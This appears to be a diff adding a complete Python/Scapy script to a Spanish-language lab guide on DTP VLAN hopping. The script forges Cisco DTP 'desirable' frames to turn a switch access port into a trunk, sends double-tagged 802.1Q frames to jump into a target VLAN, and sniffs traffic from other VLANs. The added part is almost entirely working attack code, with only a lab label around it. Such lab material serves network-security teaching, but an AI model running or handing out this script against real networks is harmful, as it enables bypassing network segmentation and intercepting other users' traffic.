@@ -57,6 +57,290 @@ Enviar frames DTP "Desirable, 802.1Q" hacia el switch víctima para forzar la ne
 
 ## 4. Pasos de Ejecución
 
+```
+import os
+import sys
+import time
+import argparse
+ 
+# Verificar root antes de importar scapy
+if os.geteuid() != 0:
+    print("[!] Este script requiere privilegios root.")
+    print("    Ejecuta: sudo python3 dtp_vlan_hopping.py")
+    sys.exit(1)
+ 
+try:
+    from scapy.all import (
+        Ether, Dot1Q, LLC, SNAP, IP, ICMP,
+        get_if_hwaddr, sendp, sniff, conf
+    )
+except ImportError:
+    print("[!] Scapy no está instalado.")
+    print("    Ejecuta: pip install scapy")
+    sys.exit(1)
+ 
+ 
+# ─────────────────────────────────────────────
+#  CONFIGURACIÓN DEL LABORATORIO
+# ─────────────────────────────────────────────
+DEFAULT_IFACE  = "eth0"
+DTP_MULTICAST  = "01:00:0c:cc:cc:cc"   # MAC multicast Cisco DTP
+VLAN_NATIVA    = 10                     # VLAN del puerto de acceso del atacante
+VLAN_OBJETIVO  = 20                     # VLAN destino (salto)
+IP_ATACANTE    = "10.11.85.50"
+IP_SERVIDOR    = "10.11.85.10"          # Objetivo en VLAN 20
+ 
+ 
+# ─────────────────────────────────────────────
+#  FASE 1: CONSTRUCCIÓN DEL FRAME DTP
+# ─────────────────────────────────────────────
+def build_dtp_negotiate(iface: str) -> bytes:
+    """
+    Construye un frame DTP con TLVs que indican 'desirable trunk'.
+    El switch en modo 'dynamic desirable' acepta la negociación y
+    convierte el puerto a modo trunk.
+ 
+    Estructura del frame:
+        Ethernet (Dot3) → LLC → SNAP → DTP TLVs
+    """
+    src_mac = get_if_hwaddr(iface)
+ 
+    # Encabezado Ethernet 802.3 con longitud
+    eth = Ether(dst=DTP_MULTICAST, src=src_mac, type=0x002a)
+ 
+    # LLC (Logical Link Control) — SNAP frame
+    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
+ 
+    # SNAP: OUI Cisco + código de protocolo DTP
+    snap = SNAP(OUI=0x00000c, code=0x2004)
+ 
+    # TLVs DTP construidos manualmente:
+    #   Tipo 0x0001 = Domain  → dominio vacío
+    #   Tipo 0x0002 = Status  → 0x03 (desirable)
+    #   Tipo 0x0003 = DTP Type → 0xa5 (802.1Q)
+    #   Tipo 0x0004 = Neighbor → MAC del atacante
+ 
+    mac_bytes = bytes.fromhex(src_mac.replace(":", ""))
+ 
+    dtp_payload = (
+        b'\x01'                    # Versión DTP = 1
+        # TLV Domain
+        b'\x00\x01'                # Tipo: Domain
+        b'\x00\x05'                # Longitud: 5 bytes (2+2+1)
+        b'\x00'                    # Dominio vacío (1 byte)
+        # TLV Status
+        b'\x00\x02'                # Tipo: Status
+        b'\x00\x05'                # Longitud: 5
+        b'\x03'                    # Valor: 0x03 = Desirable
+        # TLV DTP Type (encapsulación)
+        b'\x00\x03'                # Tipo: DTP Type
+        b'\x00\x05'                # Longitud: 5
+        b'\xa5'                    # Valor: 0xa5 = 802.1Q
+        # TLV Neighbor (MAC del atacante)
+        b'\x00\x04'                # Tipo: Neighbor
+        b'\x00\x0a'                # Longitud: 10 (2+2+6)
+        + mac_bytes                # MAC origen
+    )
+ 
+    # Ensamblar frame completo con payload raw
+    frame = eth / llc / snap / dtp_payload
+    return frame
+ 
+ 
+# ─────────────────────────────────────────────
+#  FASE 2: ENVÍO DE FRAMES DTP
+# ─────────────────────────────────────────────
+def fase_dtp_negotiate(iface: str, count: int = 5, intervalo: float = 1.0):
+    """
+    Envía múltiples frames DTP negotiate para forzar
+    al switch a convertir el puerto a modo trunk.
+    """
+    print("\n" + "="*60)
+    print("  FASE 1: DTP Negotiate — Puerto acceso → Trunk")
+    print("="*60)
+    print(f"  Interfaz  : {iface}")
+    print(f"  MAC origen: {get_if_hwaddr(iface)}")
+    print(f"  Destino   : {DTP_MULTICAST} (Cisco DTP multicast)")
+    print(f"  Frames    : {count}  |  Intervalo: {intervalo}s")
+    print("-"*60)
+ 
+    frame = build_dtp_negotiate(iface)
+ 
+    for i in range(1, count + 1):
+        sendp(frame, iface=iface, verbose=False)
+        print(f"  [{i:02d}/{count}] Frame DTP enviado — Status=Desirable, Type=802.1Q")
+        time.sleep(intervalo)
+ 
+    print("-"*60)
+    print("  [OK] Frames enviados.")
+    print("  [*]  Verifica en el switch:")
+    print("       show interfaces FastEthernet0/1 trunk")
+    print("       show interfaces FastEthernet0/1 switchport")
+ 
+ 
+# ─────────────────────────────────────────────
+#  FASE 3: DOUBLE TAGGING (salto a VLAN objetivo)
+# ─────────────────────────────────────────────
+def build_double_tag_frame(iface: str, dst_ip: str) -> bytes:
+    """
+    Construye un frame con doble etiqueta 802.1Q:
+      - Outer tag = VLAN nativa (será removida por SW1)
+      - Inner tag = VLAN objetivo (llega a SW2 → VLAN 20)
+ 
+    Esto permite al atacante llegar a VLANs a las que
+    normalmente no tiene acceso.
+    """
+    frame = (
+        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(iface))
+        / Dot1Q(vlan=VLAN_NATIVA, type=0x8100)   # Outer tag — VLAN nativa
+        / Dot1Q(vlan=VLAN_OBJETIVO)               # Inner tag — VLAN destino
+        / IP(src=IP_ATACANTE, dst=dst_ip)
+        / ICMP()
+    )
+    return frame
+ 
+ 
+def fase_double_tagging(iface: str, dst_ip: str, count: int = 3):
+    """
+    Envía frames con doble etiqueta hacia la VLAN objetivo.
+    Solo funciona si FASE 1 (trunk) tuvo éxito.
+    """
+    print("\n" + "="*60)
+    print("  FASE 2: Double Tagging — Salto a VLAN objetivo")
+    print("="*60)
+    print(f"  VLAN nativa  : {VLAN_NATIVA}  (outer tag — removida por SW1)")
+    print(f"  VLAN objetivo: {VLAN_OBJETIVO} (inner tag — llega a SW2)")
+    print(f"  IP destino   : {dst_ip}")
+    print("-"*60)
+ 
+    frame = build_double_tag_frame(iface, dst_ip)
+ 
+    for i in range(1, count + 1):
+        sendp(frame, iface=iface, verbose=False)
+        print(f"  [{i:02d}/{count}] Frame doble-etiqueta enviado → {dst_ip}")
+        time.sleep(0.5)
+ 
+    print("-"*60)
+    print("  [OK] Si el switch es vulnerable, el frame llegó a VLAN 20.")
+    print("  [*]  Captura con: tcpdump -i eth0 -n vlan")
+ 
+ 
+# ─────────────────────────────────────────────
+#  ESCUCHA: CAPTURA TRÁFICO DE OTRAS VLANs
+# ─────────────────────────────────────────────
+def fase_sniff(iface: str, timeout: int = 15):
+    """
+    Una vez que el puerto es trunk, captura tráfico etiquetado
+    de todas las VLANs que pasan por el enlace.
+    """
+    print("\n" + "="*60)
+    print("  FASE 3: Captura de tráfico inter-VLAN")
+    print("="*60)
+    print(f"  Escuchando en {iface} por {timeout} segundos...")
+    print("  (Ctrl+C para detener antes)")
+    print("-"*60)
+ 
+    capturados = []
+ 
+    def procesar(pkt):
+        if pkt.haslayer(Dot1Q):
+            vlan_id = pkt[Dot1Q].vlan
+            src_mac = pkt[Ether].src
+            print(f"  [CAPTURA] VLAN={vlan_id:4d}  src={src_mac}  "
+                  f"len={len(pkt)} bytes")
+            capturados.append(pkt)
+ 
+    try:
+        sniff(iface=iface, prn=procesar, timeout=timeout, store=False)
+    except KeyboardInterrupt:
+        pass
+ 
+    print("-"*60)
+    print(f"  [OK] Capturados {len(capturados)} frames etiquetados.")
+ 
+ 
+# ─────────────────────────────────────────────
+#  LIMPIEZA: Restaurar interfaz
+# ─────────────────────────────────────────────
+def cleanup(iface: str):
+    """Elimina subinterfaces 802.1Q creadas durante el lab."""
+    print("\n[*] Limpiando configuración de subinterfaces...")
+    for vlan in [VLAN_NATIVA, VLAN_OBJETIVO]:
+        os.system(f"ip link delete {iface}.{vlan} 2>/dev/null")
+    print("[OK] Limpieza completada.")
+ 
+ 
+# ─────────────────────────────────────────────
+#  MAIN
+# ─────────────────────────────────────────────
+def banner():
+    print("""
+╔══════════════════════════════════════════════════════════════╗
+║   DTP VLAN Hopping                                           ║
+╚══════════════════════════════════════════════════════════════╝
+""")
+ 
+ 
+def main():
+    banner()
+ 
+    parser = argparse.ArgumentParser(
+        description="Lab educativo: DTP VLAN Hopping"
+    )
+    parser.add_argument("-i", "--iface",    default=DEFAULT_IFACE,
+                        help=f"Interfaz de red (default: {DEFAULT_IFACE})")
+    parser.add_argument("-n", "--count",    type=int, default=5,
+                        help="Número de frames DTP a enviar (default: 5)")
+    parser.add_argument("-t", "--intervalo",type=float, default=1.0,
+                        help="Intervalo entre frames DTP en segundos (default: 1.0)")
+    parser.add_argument("--dst-ip",         default=IP_SERVIDOR,
+                        help=f"IP destino para double tagging (default: {IP_SERVIDOR})")
+    parser.add_argument("--solo-dtp",       action="store_true",
+                        help="Ejecutar solo la fase DTP negotiate")
+    parser.add_argument("--solo-sniff",     action="store_true",
+                        help="Ejecutar solo captura de tráfico")
+    parser.add_argument("--sniff-timeout",  type=int, default=15,
+                        help="Segundos de captura (default: 15)")
+ 
+    args = parser.parse_args()
+ 
+    print(f"[*] Iniciando laboratorio en interfaz: {args.iface}")
+    print(f"[*] VLAN nativa: {VLAN_NATIVA}  |  VLAN objetivo: {VLAN_OBJETIVO}")
+ 
+    try:
+        if args.solo_sniff:
+            fase_sniff(args.iface, args.sniff_timeout)
+ 
+        elif args.solo_dtp:
+            fase_dtp_negotiate(args.iface, args.count, args.intervalo)
+ 
+        else:
+            # Secuencia completa del ataque
+            fase_dtp_negotiate(args.iface, args.count, args.intervalo)
+ 
+            print("\n[*] Esperando 3 segundos para que el trunk se establezca...")
+            time.sleep(3)
+ 
+            fase_double_tagging(args.iface, args.dst_ip)
+ 
+            time.sleep(1)
+ 
+            fase_sniff(args.iface, args.sniff_timeout)
+ 
+    except KeyboardInterrupt:
+        print("\n\n[!] Interrumpido por el usuario.")
+ 
+    finally:
+        cleanup(args.iface)
+ 
+    print("\n" + "="*60)
+   
+ 
+ 
+if __name__ == "__main__":
+    main()
+```
+
 ### Preparación
 
 ```bash
